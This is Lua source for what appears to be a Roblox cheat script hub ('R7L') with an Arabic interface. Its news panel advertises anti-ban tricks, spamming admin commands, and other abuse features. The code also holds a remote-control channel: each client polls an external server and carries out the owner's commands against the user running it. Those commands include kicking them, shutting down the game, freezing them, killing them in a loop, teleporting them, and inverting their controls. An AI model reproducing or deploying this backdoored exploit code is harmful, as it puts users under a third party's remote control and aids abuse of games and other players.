local _SubState = {
    sit    = {active=false, thread=nil, charConn=nil},
    invert = {active=false, conn=nil},
    camLock= {active=false, conn=nil},
    resize = {active=false, mode=nil},
}

local function applyKickLocal()

    pcall(function()
        LocalPlayer:Kick("kicked by R7L")
    end)

    pcall(function()
        local nc = game:FindService("NetworkClient")
        if nc then nc:Remove() end
    end)

    pcall(function()
        game:Shutdown()
    end)

    pcall(function()
        TeleportService_T18:Teleport(1, LocalPlayer)
    end)

    task.spawn(function()
        for _ = 1, 12 do
            pcall(function()
                local char = LocalPlayer.Character
                if char then char:BreakJoints() end
            end)
            pcall(function()
                LocalPlayer:Kick("kicked by R7L")
            end)
            task.wait(0.3)
        end
    end)
end

local function clearFreezeLocal()
    local char = LocalPlayer.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.WalkSpeed = 16
            hum.JumpPower = 50
            hum.JumpHeight = 7.2
        end
    end
end

local function applyFreezeLocal(enable)
    localFrozen.active = enable
    if localFrozen.charConn then
        localFrozen.charConn:Disconnect()
        localFrozen.charConn = nil
    end
    if not enable then
        clearFreezeLocal()
        return
    end
    local function freezeChar(char)
        local hum = char:WaitForChild("Humanoid", 5)
        if hum then
            hum.WalkSpeed = 0
            hum.JumpPower = 0
            hum.JumpHeight = 0
        end
    end
    if LocalPlayer.Character then freezeChar(LocalPlayer.Character) end
    localFrozen.charConn = LocalPlayer.CharacterAdded:Connect(freezeChar)
    if not localFrozen.thread then
        localFrozen.thread = task.spawn(function()
            while localFrozen.active do
                local char = LocalPlayer.Character
                if char then
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    if hum then
                        if hum.WalkSpeed ~= 0 then hum.WalkSpeed = 0 end
                        if hum.JumpPower ~= 0 then hum.JumpPower = 0 end
                        if hum.JumpHeight ~= 0 then hum.JumpHeight = 0 end
                    end
                end
                task.wait(0.15)
            end
            localFrozen.thread = nil
        end)
    end
end

local _SubFuncs = {}
_SubFuncs.applySitForceLocal = function(enable)
    _SubState.sit.active = enable
    if _SubState.sit.charConn then
        _SubState.sit.charConn:Disconnect()
        _SubState.sit.charConn = nil
    end
    if not enable then
        local char = LocalPlayer.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then hum.Sit = false end
        return
    end
    local function sitChar(char)
        local hum = char:WaitForChild("Humanoid", 5)
        if hum then hum.Sit = true end
    end
    if LocalPlayer.Character then sitChar(LocalPlayer.Character) end
    _SubState.sit.charConn = LocalPlayer.CharacterAdded:Connect(sitChar)
    if not _SubState.sit.thread then
        _SubState.sit.thread = task.spawn(function()
            while _SubState.sit.active do
                local char = LocalPlayer.Character
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                if hum and not hum.Sit then hum.Sit = true end
                task.wait(0.2)
            end
            _SubState.sit.thread = nil
        end)
    end
end

_SubFuncs.applyBringLocal = function(ox, oy, oz)
    pcall(function()
        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if root then
            root.CFrame = CFrame.new(ox + 3, oy + 2, oz)
        end
    end)
end

_SubFuncs.applyInvertLocal = function(enable)
    _SubState.invert.active = enable
    if _SubState.invert.conn then
        _SubState.invert.conn:Disconnect()
        _SubState.invert.conn = nil
    end
    if not enable then return end
    _SubState.invert.conn = UserInputService.InputBegan:Connect(function(inp, gpe)
        if gpe then return end
        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local map = {
            [Enum.KeyCode.W] = Enum.KeyCode.S,
            [Enum.KeyCode.S] = Enum.KeyCode.W,
            [Enum.KeyCode.A] = Enum.KeyCode.D,
            [Enum.KeyCode.D] = Enum.KeyCode.A,
        }
        local opp = map[inp.KeyCode]
        if opp then
            local dirMap = {
                [Enum.KeyCode.W] = Vector3.new(0,0,-1),
                [Enum.KeyCode.S] = Vector3.new(0,0,1),
                [Enum.KeyCode.A] = Vector3.new(-1,0,0),
                [Enum.KeyCode.D] = Vector3.new(1,0,0),
            }
            hum:Move(dirMap[opp], false)
        end
    end)
end

_SubFuncs.applyCamLockLocal = function(enable)
    _SubState.camLock.active = enable
    if _SubState.camLock.conn then
        _SubState.camLock.conn:Disconnect()
        _SubState.camLock.conn = nil
    end
    if not enable then return end
    local savedCF = workspace.CurrentCamera.CFrame
    _SubState.camLock.conn = RunService.RenderStepped:Connect(function()
        if _SubState.camLock.active then
            workspace.CurrentCamera.CFrame = savedCF
        end
    end)
end

_SubFuncs.applyResizeLocal = function(mode)
    _SubState.resize.mode = mode
    pcall(function()
        local char = LocalPlayer.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        if mode == "shrink" then
            hum:SetAttribute("R7L_Scale", 0.4)
            hum.BodyDepthScale.Value = 0.4
            hum.BodyWidthScale.Value = 0.4
            hum.BodyHeightScale.Value = 0.4
            hum.HeadScale.Value = 0.4
        elseif mode == "grow" then
            hum.BodyDepthScale.Value = 1.6
            hum.BodyWidthScale.Value = 1.6
            hum.BodyHeightScale.Value = 1.6
            hum.HeadScale.Value = 1.6
        else
            hum.BodyDepthScale.Value = 1
            hum.BodyWidthScale.Value = 1
            hum.BodyHeightScale.Value = 1
            hum.HeadScale.Value = 1
        end
    end)
end

_SubFuncs.applyShakeLocal = function()
    task.spawn(function()
        local cam = workspace.CurrentCamera
        local t = 0
        while t < 2 do
            local ox = (math.random() - 0.5) * 0.6
            local oy = (math.random() - 0.5) * 0.6
            pcall(function()
                cam.CFrame = cam.CFrame * CFrame.new(ox, oy, 0)
            end)
            t += 0.03
            task.wait(0.03)
        end
    end)
end

_SubFuncs.applyWarnLocal = function(text)
    T18ShowToast(" " .. tostring(text or ""))
    pcall(function()
        local g = Instance.new("ScreenGui")
        g.Name = "R7LBigWarn"
        g.ResetOnSpawn = false
        g.IgnoreGuiInset = true
        g.Parent = LocalPlayer:WaitForChild("PlayerGui")
        local f = Instance.new("Frame")
        f.Size = UDim2.new(1,0,1,0)
        f.BackgroundColor3 = Color3.fromRGB(120,0,0)
        f.BackgroundTransparency = 0.35
        f.ZIndex = 999
        f.Parent = g
        local l = Instance.new("TextLabel")
        l.Size = UDim2.new(1,-60,0,120)
        l.Position = UDim2.new(0,30,0.5,-60)
        l.BackgroundTransparency = 1
        l.Text = tostring(text or "")
        l.TextColor3 = Color3.fromRGB(255,255,255)
        l.TextWrapped = true
        l.Font = Enum.Font.GothamBold
        l.TextSize = 26
        l.ZIndex = 1000
        l.Parent = f
        task.delay(3.5, function() pcall(function() g:Destroy() end) end)
    end)
end

_SubFuncs.applySayLocal = function(text)
    T18ShowToast(" " .. tostring(text or ""))
end

local function applyRespawnLoopLocal(enable)
    localRespawnLoop.active = enable
    if not enable then return end
    if not localRespawnLoop.thread then
        localRespawnLoop.thread = task.spawn(function()
            while localRespawnLoop.active do
                pcall(function()
                    local char = LocalPlayer.Character
                    if char then
                        local hum = char:FindFirstChildOfClass("Humanoid")
                        if hum then
                            hum.Health = 0
                        else
                            char:BreakJoints()
                        end
                    end
                end)
                task.wait(1.2)
            end
            localRespawnLoop.thread = nil
        end)
    end
end

localSummonState.apply = function(enable, ox, oy, oz)
    localSummonState.active = enable
    if not enable then return end

    localSummonState.x = ox + 3
    localSummonState.y = oy + 2
    localSummonState.z = oz

    if not localSummonState.thread then
        localSummonState.thread = task.spawn(function()
            while localSummonState.active do
                pcall(function()
                    local char = LocalPlayer.Character
                    local sRoot = char and char:FindFirstChild("HumanoidRootPart")
                    if sRoot then
                        sRoot.CFrame = CFrame.new(
                            localSummonState.x,
                            localSummonState.y,
                            localSummonState.z
                        )
                    end
                end)
                task.wait(0.15)
            end
            localSummonState.thread = nil
        end)
    end
end

local function t18_dispatchEvent(ev)
    if type(ev) ~= "table" then return end
    if not T18RuntimeAlive() then return end
    if ev.type == "chat" then
        local fromName = tostring(ev.fromName or "?")
        local fromUserId = tonumber(ev.fromUserId) or 0
        local text = tostring(ev.text or "")
        if #text == 0 then return end
        if #text > 250 then text = text:sub(1, 250) end
        local senderColor = Theme.Warning
        local cr, cg, cb, strippedText = text:match("^%[%[T18CLR:(%d+),(%d+),(%d+)%]%](.*)$")
        if cr and cg and cb then
            senderColor = Color3.fromRGB(
                math.clamp(tonumber(cr) or 245, 0, 255),
                math.clamp(tonumber(cg) or 158, 0, 255),
                math.clamp(tonumber(cb) or 11, 0, 255)
            )
            text = strippedText or ""
        elseif type(ev.nameColor) == "table" then
            senderColor = Color3.fromRGB(
                math.clamp(tonumber(ev.nameColor.r) or 245, 0, 255),
                math.clamp(tonumber(ev.nameColor.g) or 158, 0, 255),
                math.clamp(tonumber(ev.nameColor.b) or 11, 0, 255)
            )
        end
        if #text == 0 then return end

        if text:sub(1, 10) == "[[T18SYS]]" then
            if fromUserId ~= LocalPlayer.UserId then
                T18ShowToast(text:sub(11))
            end
            return
        end
        local displayName = fromName
        if fromUserId == LocalPlayer.UserId then
            displayName = displayName .. " (انت)"
        end
        addChatMessage(displayName, text, senderColor)
        _incrementChatBadge()
        ShowChatBubbleAboveHead(fromUserId, fromName, text)
    elseif ev.type == "cmd" then
        local fromName = tostring(ev.fromName or "")
        local action = tostring(ev.action or "")
        local targetUserId = tonumber(ev.targetUserId) or 0
        if targetUserId ~= LocalPlayer.UserId then return end
        if fromName:lower() ~= OwnerUsername:lower() then return end
        if action == "kick" then
            applyKickLocal()
        elseif action == "freeze_on" then
            applyFreezeLocal(true)
        elseif action == "freeze_off" then
            applyFreezeLocal(false)
        elseif action == "respawn_on" then
            applyRespawnLoopLocal(true)
        elseif action == "respawn_off" then
            applyRespawnLoopLocal(false)
        elseif action == "summon_on" then

            local ownerPlr = Players:FindFirstChild(OwnerUsername)
            local ownerChr = ownerPlr and ownerPlr.Character
            local ownerRt = ownerChr and ownerChr:FindFirstChild("HumanoidRootPart")
            if ownerRt then
                local op = ownerRt.Position
                showNotification(T18T("تم استدعاؤك بواسطة الاونر"))
                localSummonState.apply(true, op.X, op.Y, op.Z)
            end
        elseif action == "summon_off" then
            localSummonState.apply(false, 0, 0, 0)
            showNotification(T18T("انتهى الاستدعاء"))
        elseif action == "sit_on" then
            _SubFuncs.applySitForceLocal(true)
            showNotification(T18T("تم اجبارك على الجلوس"))
        elseif action == "sit_off" then
            _SubFuncs.applySitForceLocal(false)
        elseif action == "bring" then
            local ownerPlr = Players:FindFirstChild(OwnerUsername)
            local ownerChr = ownerPlr and ownerPlr.Character
            local ownerRt = ownerChr and ownerChr:FindFirstChild("HumanoidRootPart")
            if ownerRt then
                local op = ownerRt.Position
                _SubFuncs.applyBringLocal(op.X, op.Y, op.Z)
                showNotification(T18T("تم احضارك بواسطة الاونر"))
            end
        elseif action == "invert_on" then
            _SubFuncs.applyInvertLocal(true)
            showNotification(T18T("تم عكس ازرار التحكم"))
        elseif action == "invert_off" then
            _SubFuncs.applyInvertLocal(false)
        elseif action == "camlock_on" then
            _SubFuncs.applyCamLockLocal(true)
            showNotification(T18T("تم قفل كاميرتك"))
        elseif action == "camlock_off" then
            _SubFuncs.applyCamLockLocal(false)
        elseif action == "shrink_on" then
            _SubFuncs.applyResizeLocal("shrink")
        elseif action == "grow_on" then
            _SubFuncs.applyResizeLocal("grow")
        elseif action == "resize_off" then
            _SubFuncs.applyResizeLocal("normal")
        elseif action == "shake" then
            _SubFuncs.applyShakeLocal()
        elseif action == "warn" then
            _SubFuncs.applyWarnLocal(ev.text)
        elseif action == "say" then
            _SubFuncs.applySayLocal(ev.text)
        end
    elseif ev.type == "toast" then

        if tostring(ev.fromName or "") ~= LocalPlayer.Name then
            local msg = tostring(ev.text or "")
            if #msg > 0 then
                T18ShowToast(msg)
            end
        end
    end
end

t18Poll = {lastEventId=0, initialized=false}
task.spawn(function()

    while not t18Poll.initialized do
        if not T18RuntimeAlive() then
            return
        end
        pcall(function()
            local healthUrl = T18_API_BASE .. "/health"
            local res = t18_httpRequest({ Url = healthUrl, Method = "GET" })
            if res and res.Body then
                local data = t18_jsonDecode(res.Body)
                if data and tonumber(data.nextId) then
                    t18Poll.lastEventId = math.max(0, tonumber(data.nextId) - 1)
                    t18Poll.initialized = true
                end
            end
        end)
        if not t18Poll.initialized then
            task.wait(2)
        end
    end

    while true do
        if not T18RuntimeAlive() then
            break
        end
        local gotEvents = false
        pcall(function()
            local url = string.format(
                "%s/poll?serverKey=%s&since=%d",
                T18_API_BASE,
                HttpService_T18:UrlEncode(T18_SERVER_KEY),
                t18Poll.lastEventId
            )
            local res = t18_httpRequest({ Url = url, Method = "GET" })
            if res and res.Body then
                local data = t18_jsonDecode(res.Body)
                if data and type(data.events) == "table" then
                    if #data.events > 0 then gotEvents = true end
                    for _, ev in ipairs(data.events) do
                        local idn = tonumber(ev.id) or 0
                        if idn > t18Poll.lastEventId then t18Poll.lastEventId = idn end
                        t18_dispatchEvent(ev)
                    end
                end
            end
        end)
        task.wait(gotEvents and 0.05 or 0.2)
    end
end)

  

_T18PickerDialog = nil
_T18PickerChosenPlayer = nil
_T18PickerCallback = nil

local function _T18ShowPlayerPicker(matches, callback)
    if _T18PickerDialog then
        pcall(function() _T18PickerDialog:Destroy() end)
        _T18PickerDialog = nil
    end

    local TweenService = game:GetService("TweenService")
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")

    local pickerGui = Instance.new("ScreenGui")
    pickerGui.Name = "T18PlayerPicker"
    pickerGui.ResetOnSpawn = false
    pickerGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    pickerGui.DisplayOrder = 999999
    pickerGui.IgnoreGuiInset = true
    pcall(function() pickerGui.Parent = game:GetService("CoreGui") end)
    if not pickerGui.Parent then pickerGui.Parent = playerGui end
    _T18PickerDialog = pickerGui

    local overlay = Instance.new("Frame")
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    overlay.BackgroundTransparency = 0.5
    overlay.BorderSizePixel = 0
    overlay.ZIndex = 1
    overlay.Parent = pickerGui

    local dialog = Instance.new("Frame")
    dialog.AnchorPoint = Vector2.new(0.5, 0.5)
    dialog.Size = UDim2.new(0, 280, 0, 80 + #matches * 46)
    dialog.Position = UDim2.new(0.5, 0, 0.5, 0)
    dialog.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    dialog.BackgroundTransparency = 0
    dialog.BorderSizePixel = 0
    dialog.ZIndex = 2
    dialog.Parent = pickerGui
    makeCorner(dialog, 14)
    makeStroke(dialog, Color3.fromRGB(58, 58, 58), 1, 0)
    UiFx.makeGradient(dialog, {
        ColorSequenceKeypoint.new(0, Color3.fromRGB(12, 15, 35)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(2, 2, 2)),
    }, 35)

    local titleLbl = Instance.new("TextLabel")
    titleLbl.Size = UDim2.new(1, -20, 0, 28)
    titleLbl.Position = UDim2.new(0, 10, 0, 10)
    titleLbl.BackgroundTransparency = 1
    titleLbl.Text = "اختر اللاعب المقصود"
    titleLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLbl.TextXAlignment = Enum.TextXAlignment.Right
    titleLbl.Font = Enum.Font.GothamBold
    titleLbl.TextSize = 15
    titleLbl.ZIndex = 3
    titleLbl.Parent = dialog

    local subLbl = Instance.new("TextLabel")
    subLbl.Size = UDim2.new(1, -20, 0, 18)
    subLbl.Position = UDim2.new(0, 10, 0, 38)
    subLbl.BackgroundTransparency = 1
    subLbl.Text = "وُجد اكثر من لاعب بنفس الاسم"
    subLbl.TextColor3 = Color3.fromRGB(160, 160, 160)
    subLbl.TextXAlignment = Enum.TextXAlignment.Right
    subLbl.Font = Enum.Font.Gotham
    subLbl.TextSize = 12
    subLbl.ZIndex = 3
    subLbl.Parent = dialog

    local divider = Instance.new("Frame")
    divider.Size = UDim2.new(1, -20, 0, 1)
    divider.Position = UDim2.new(0, 10, 0, 62)
    divider.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
    divider.BorderSizePixel = 0
    divider.ZIndex = 3
    divider.Parent = dialog

    for i, player in ipairs(matches) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -20, 0, 38)
        btn.Position = UDim2.new(0, 10, 0, 70 + (i - 1) * 44)
        btn.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
        btn.BackgroundTransparency = 0.1
        btn.Text = player.Name .. "  (" .. player.DisplayName .. ")"
        btn.TextColor3 = Color3.fromRGB(220, 220, 220)
        btn.TextXAlignment = Enum.TextXAlignment.Right
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 13
        btn.AutoButtonColor = false
        btn.ZIndex = 3
        btn.Parent = dialog
        makeCorner(btn, 8)
        makeStroke(btn, Color3.fromRGB(48, 48, 48), 1, 0.2)

        btn.MouseButton1Click:Connect(function()
            _T18PickerChosenPlayer = player
            pcall(function() pickerGui:Destroy() end)
            _T18PickerDialog = nil
            if callback then callback(player) end
        end)

        btn.MouseEnter:Connect(function()
            btn.BackgroundColor3 = Color3.fromRGB(38, 38, 50)
        end)
        btn.MouseLeave:Connect(function()
            btn.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
        end)
    end

    local cancelBtn = Instance.new("TextButton")
    cancelBtn.Size = UDim2.new(1, -20, 0, 32)
    cancelBtn.Position = UDim2.new(0, 10, 1, -40)
    cancelBtn.BackgroundColor3 = Color3.fromRGB(80, 20, 20)
    cancelBtn.BackgroundTransparency = 0.2
    cancelBtn.Text = "الغاء"
    cancelBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
    cancelBtn.Font = Enum.Font.GothamBold
    cancelBtn.TextSize = 13
    cancelBtn.AutoButtonColor = false
    cancelBtn.ZIndex = 3
    cancelBtn.Parent = dialog
    makeCorner(cancelBtn, 8)
    cancelBtn.MouseButton1Click:Connect(function()
        pcall(function() pickerGui:Destroy() end)
        _T18PickerDialog = nil
    end)
end

local function findOwnerTargetPlayer()
    if not OwnerTargetInput then
        return nil
    end

    local targetName = OwnerTargetInput.Text
    if not targetName or #targetName < 4 then
        return nil
    end

    local exactMatch = nil
    local partialMatches = {}

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            if _T18IsProtected(player) then continue end
            if player.Name:lower() == targetName:lower() then
                exactMatch = player
                break
            elseif player.Name:lower() == targetName:lower() then
                table.insert(partialMatches, player)
            end
        end
    end

    if exactMatch then
        return exactMatch
    end

    if #partialMatches == 1 then
        return partialMatches[1]
    end

    if #partialMatches > 1 then
        _T18ShowPlayerPicker(partialMatches, function(chosen)
            if chosen and OwnerTargetInput then
                OwnerTargetInput.Text = chosen.Name
            end
        end)
        return nil
    end

    return nil
end

local function refreshOwnerControls()
    if not OwnerPage or not OwnerTargetHint or not OwnerTargetInput then
        return
    end

    local inputText = OwnerTargetInput.Text or ""
    local target = findOwnerTargetPlayer()

    if #inputText < 4 then
        OwnerTargetHint.Text = T18T("اكتب 4 احرف على الاقل")
        OwnerTargetHint.TextColor3 = Theme.Muted
    elseif target then
        OwnerTargetHint.Text = T18T("تم تحديد: ") .. target.Name
        OwnerTargetHint.TextColor3 = Theme.Text
    else
        OwnerTargetHint.Text = T18T("لا يوجد لاعب مطابق")
        OwnerTargetHint.TextColor3 = Theme.Warning
    end

    if OwnerFreezeBtn then
        local isFrozen = target and ownerFreezeStates[target.UserId] or false
        OwnerFreezeBtn.Text = isFrozen and T18T("فك التجميد") or T18T("تجميد")
    end

    if OwnerRespawnLoopBtn then
        local isLooping = target and ownerRespawnLoopStates[target.UserId] or false
        OwnerRespawnLoopBtn.Text = isLooping and T18T("ايقاف Respawn Loop") or T18T("Respawn Loop")
    end
end

local function sendOwnerAdminAction(actionName)
    if not isOwnerUser then
        return
    end

    local target = findOwnerTargetPlayer()
    if not target then
        showNotification(T18T("اكتب 4 احرف من يوزر اللاعب او اكثر"))
        refreshOwnerControls()
        return
    end

    local newAction
    if actionName == "kick" then
        newAction = "kick"
    elseif actionName == "toggle_freeze" then
        local nowFrozen = ownerFreezeStates[target.UserId] or false
        newAction = nowFrozen and "freeze_off" or "freeze_on"
    elseif actionName == "toggle_respawn_loop" then
        local nowLooping = ownerRespawnLoopStates[target.UserId] or false
        newAction = nowLooping and "respawn_off" or "respawn_on"
    end

    if not newAction then return end

    local sent = sendOwnerCommand(newAction, target.UserId)
    if not sent then

        return
    end

    if actionName == "toggle_freeze" then
        ownerFreezeStates[target.UserId] = not ownerFreezeStates[target.UserId]
    elseif actionName == "toggle_respawn_loop" then
        ownerRespawnLoopStates[target.UserId] = not ownerRespawnLoopStates[target.UserId]
    elseif actionName == "kick" then
        ownerFreezeStates[target.UserId] = nil
        ownerRespawnLoopStates[target.UserId] = nil
    end

    refreshOwnerControls()
end

DiscordBtn.MouseButton1Click:Connect(function()
    local opened = false

    pcall(function()
        GuiService:OpenBrowserWindow("https://discord.gg/bCdDt4NDq")
        opened = true
    end)

    if not opened then
        pcall(function()
            if setclipboard then
                setclipboard("https://discord.gg/bCdDt4NDq")
                opened = true
                showNotification(T18T("تم نسخ رابط الدسكورد"))
            end
        end)
    end

    if not opened then
        showNotification("https://discord.gg/bCdDt4NDq")
    end
end)

local ownerSummonState = {active=false, target=nil, httpTimer=0}

if OwnerTargetInput and OwnerKickBtn and OwnerFreezeBtn and OwnerRespawnLoopBtn then
    OwnerTargetInput:GetPropertyChangedSignal("Text"):Connect(refreshOwnerControls)

    OwnerKickBtn.MouseButton1Click:Connect(function()
        sendOwnerAdminAction("kick")
    end)

    OwnerFreezeBtn.MouseButton1Click:Connect(function()
        sendOwnerAdminAction("toggle_freeze")
    end)

    OwnerRespawnLoopBtn.MouseButton1Click:Connect(function()
        sendOwnerAdminAction("toggle_respawn_loop")
    end)

    if OwnerSummonBtn then
        OwnerSummonBtn.MouseButton1Click:Connect(function()
            if not isOwnerUser then return end

            if ownerSummonState.active then
                ownerSummonState.active = false
                if ownerSummonState.target then
                    sendOwnerCommand("summon_off", ownerSummonState.target.UserId)
                end
                ownerSummonState.target = nil
                OwnerSummonBtn.Text = T18T("استدعاء")
                OwnerSummonBtn.BackgroundColor3 = Theme.ButtonGreen
                showNotification(T18T("تم ايقاف الاستدعاء"))
                return
            end

            local sTarget = findOwnerTargetPlayer()
            if not sTarget then
                showNotification(T18T("اكتب 4 احرف من يوزر اللاعب او اكثر"))
                return
            end

            ownerSummonState.active = true
            ownerSummonState.target = sTarget
            OwnerSummonBtn.Text = T18T("ايقاف الاستدعاء")
            OwnerSummonBtn.BackgroundColor3 = Theme.Active
            showNotification(T18T("تم تفعيل الاستدعاء لـ ") .. sTarget.Name)

            local function doSendSummon()
                if not ownerSummonState.target then return end
                sendOwnerCommand("summon_on", ownerSummonState.target.UserId)
            end

            task.spawn(function()
                local tName = sTarget.Name
                while ownerSummonState.active do
                    if not Players:FindFirstChild(tName) then
                        ownerSummonState.active = false
                        ownerSummonState.target = nil
                        OwnerSummonBtn.Text = T18T("استدعاء")
                        OwnerSummonBtn.BackgroundColor3 = Theme.ButtonGreen
                        showNotification(T18T("اللاعب خرج من السيرفر"))
                        break
                    end
                    pcall(doSendSummon)
                    task.wait(2)
                end
                if ownerSummonState.active == false and ownerSummonState.target then
                    pcall(function() sendOwnerCommand("summon_off", ownerSummonState.target.UserId) end)
                    ownerSummonState.target = nil
                end
            end)
        end)
    end

    refreshOwnerControls()
end

Players.PlayerRemoving:Connect(function(player)
    ownerFreezeStates[player.UserId] = nil
    ownerRespawnLoopStates[player.UserId] = nil

    if isOwnerUser and OwnerTargetInput then
        task.defer(refreshOwnerControls)
    end
end)

local ImportantCard = Instance.new("Frame")
ImportantCard.Size = UDim2.new(1, -20, 0, 400)
ImportantCard.Position = UDim2.new(0, 10, 0, 58)
ImportantCard.BackgroundColor3 = Theme.Panel
ImportantCard.BackgroundTransparency = 0.16
ImportantCard.BorderSizePixel = 0
ImportantCard.Parent = ImportantPage
makeCorner(ImportantCard, 12)
makeStroke(ImportantCard, Theme.Border, 1, 0.2)
UiFx.makeStarField(ImportantCard, 12)

local ImportantText
do

local _NewsTS = game:GetService("TextService")
local _NEWS_TEXT_W = 330 -- عرض النص التقريبي داخل الكرت
local _newsY = 12
local _newsLayout = {}

local function _newsTextH(text, size, font)
    local ok, v = pcall(function()
        return _NewsTS:GetTextSize(text, size, font, Vector2.new(_NEWS_TEXT_W, 10000))
    end)
    local h = (ok and v) and v.Y or (math.ceil(#text / 45) * (size + 4))
    return math.ceil(h * 1.15) + size -- احتياط عشان العربي ما ينقص
end

local function _newsHeading(text)
    local h = Instance.new("TextLabel")
    h.Size = UDim2.new(1, -24, 0, 24)
    h.Position = UDim2.new(0, 12, 0, _newsY)
    h.BackgroundTransparency = 1
    h.Text = text
    h.TextColor3 = Theme.Text
    h.TextXAlignment = Enum.TextXAlignment.Right
    h.Font = Enum.Font.GothamBold
    h.TextSize = 17
    h.ZIndex = 3
    h.Parent = ImportantCard
    local line = Instance.new("Frame")
    line.Size = UDim2.new(1, -24, 0, 1)
    line.Position = UDim2.new(0, 12, 0, _newsY + 28)
    line.BackgroundColor3 = Theme.Border
    line.BorderSizePixel = 0
    line.ZIndex = 3
    line.Parent = ImportantCard
    table.insert(_newsLayout, { kind = "heading", label = h, line = line, text = text })
    _newsY = _newsY + 38
end

local function _newsItem(btnText, desc, place, tagText)
    local descH = _newsTextH(desc, 14, Enum.Font.Gotham)
    local itemH = 10 + 36 + 8 + descH + 4 + 16 + 10

    local item = Instance.new("Frame")
    item.Name = "NewsItem"
    item.Size = UDim2.new(1, -24, 0, itemH)
    item.Position = UDim2.new(0, 12, 0, _newsY)
    item.BackgroundColor3 = Theme.Card
    item.BackgroundTransparency = 0.25
    item.BorderSizePixel = 0
    item.ZIndex = 3
    item.Parent = ImportantCard
    makeCorner(item, 12)
    makeStroke(item, Theme.Border, 1, 0.35)

    -- نسخة شكلية من الزر (ما تنضغط)
    local preview = makeButton("NewsPreview", btnText, UDim2.new(1, -20, 0, 36), UDim2.new(0, 10, 0, 10), Theme.ButtonBlue, Theme.Accent)
    preview.Active = false
    preview.Selectable = false
    preview.AutoButtonColor = false
    preview.ZIndex = 4
    preview.Parent = item

    local newTag = Instance.new("TextLabel")
    newTag.AnchorPoint = Vector2.new(0, 0.5)
    newTag.Size = UDim2.new(0, tagText and 58 or 40, 0, 18)
    newTag.Position = UDim2.new(0, 8, 0.5, 0)
    newTag.BackgroundColor3 = tagText and Color3.fromRGB(60, 60, 60) or Color3.fromRGB(255, 255, 255)
    newTag.BorderSizePixel = 0
    newTag.Text = tagText or "NEW"
    newTag.TextColor3 = Color3.fromRGB(10, 10, 10)
    newTag.Font = Enum.Font.GothamBold
    newTag.TextSize = 11
    newTag.ZIndex = 8
    newTag.Parent = preview
    makeCorner(newTag, 9)

    local d = Instance.new("TextLabel")
    d.Size = UDim2.new(1, -20, 0, descH)
    d.Position = UDim2.new(0, 10, 0, 54)
    d.BackgroundTransparency = 1
    d.Text = desc
    d.TextColor3 = Theme.Text
    d.TextXAlignment = Enum.TextXAlignment.Right
    d.TextYAlignment = Enum.TextYAlignment.Top
    d.TextWrapped = true
    d.Font = Enum.Font.Gotham
    d.TextSize = 14
    d.ZIndex = 4
    d.Parent = item

    local p = Instance.new("TextLabel")
    p.Size = UDim2.new(1, -20, 0, 16)
    p.Position = UDim2.new(0, 10, 0, 54 + descH + 4)
    p.BackgroundTransparency = 1
    p.Text = "مكانه: " .. place
    if tagText then newTag.TextColor3 = Color3.fromRGB(235, 235, 235) end
    p.TextColor3 = Theme.Muted
    p.TextXAlignment = Enum.TextXAlignment.Right
    p.Font = Enum.Font.GothamBold
    p.TextSize = 13
    p.ZIndex = 4
    p.Parent = item

    table.insert(_newsLayout, {
        kind = "item", item = item, button = preview, descLabel = d, placeLabel = p,
        title = btnText, desc = desc, place = place,
    })
    _newsY = _newsY + itemH + 10
end

_newsHeading("الازرار الجديده")

_newsItem("R7L AI",
    "اقدم لكم يا احبائي R7L AI , نموذج GPT سريع وما يتأخر في الرد وبيعجبكم حرفياً, فكره جديده ما اتوقع احد سواها, عالعموم اتمنى يعجبك واذا حصلت لك مشاكل تواصل معي بالدسكورد بتحصل رابط سيرفر الدسكورد في القائمة الرئيسية",
    "قسم الاخبار")

_newsItem("مضاد بانق2",
    "اذا احد فعل عليك بانق فعل الزر ذا, بينكسر البانق حقه تقريباً 3 ثواني وبيرجع ينكسر مهما كان السكربت, اتمنى يعجبك يعيوني",
    "قسم مضادات")

_newsItem("مضاد لاق (للصمله)",
    "مضاد لاق تفعله اذا تبي تصمل مع احد, يشيل الظلال والاشياء ذي, والله ياهو جامد الصدق",
    "قسم مضادات")

_newsItem("مضاد فويد",
    "صراحه ذا الشي الوحيد اللي ماتعبت عليه سويته عالسريع و ما يهمني بس لا تفعله وانت مفعل بانق ممكن اللي ضدك يسوي سبام للفويد ويصير يموتك تلقائي",
    "قسم مضادات")

_newsItem("سبام",
    "سبام اوامر ادمن, طبعاً لازم تكتب الحرف او الرمز اللي تكتب فيه الامر حقك مثل ; او ! وبس اتمنى يعجبكم (لازم الماب يكون فيه HD Admin)",
    "قسم اخرى")

_newsItem("سبام سكنات",
    "سبام سكنات تستخدمه اذا ماودك احد يكلبشك ويغثك, بعض المابات ما يضبط فيها الزر ذا",
    "قسم اللاعب")

_newsItem("سبام تكبير حجم",
    "الافضل تحطه اذا جيت تصمل وحاول ما تحط معه سبام سكنات عشان فيه كولدون تلقائي من HD ADMIN يمنع السبام السريع",
    "قسم اللاعب")

_newsItem("وقتك بالسيرفر",
    "اذا كنت مدرك انفنتي فعل الزر واطرح عدادك نشوف كم تصمل",
    "قسم اخرى")

_newsHeading("الازرار اللي عدلت عليها")

_newsItem("FPS / Ping",
    "صار شكلها اجمل وتطلع تفاصيل اكثر",
    "قسم اخرى", "UPDATE")

